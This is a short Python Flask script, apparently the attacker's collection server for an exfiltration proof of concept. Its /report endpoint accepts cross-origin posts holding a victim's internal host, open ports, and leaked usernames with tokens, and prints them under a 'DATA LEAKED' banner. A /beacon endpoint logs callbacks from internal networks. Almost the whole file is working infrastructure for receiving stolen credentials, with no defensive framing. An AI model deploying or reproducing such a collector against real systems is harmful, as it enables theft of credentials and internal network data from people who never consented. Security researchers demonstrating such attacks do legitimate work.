# Author: John EBinyi Odey aka Redhound

from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # This enables CORS for all routes

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    print("\n" + "="*50)
    print("🚨 ALERT: INTERNAL DATA LEAKED!")
    print("="*50)
    print("Host:", data.get("host"))
    print("Ports:", data.get("ports"))
    print("Leaked Users:")
    for user in data.get("leakedData", []):
        print(f"   👤 {user.get('username')} | 🔑 {user.get('token')}")

    return jsonify({"status": "received"}), 200

@app.route('/beacon')
def beacon():
    print("\n📡 Internal Beacon Hit!")
    print("🟢 Query Params:", dict(request.args))
    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
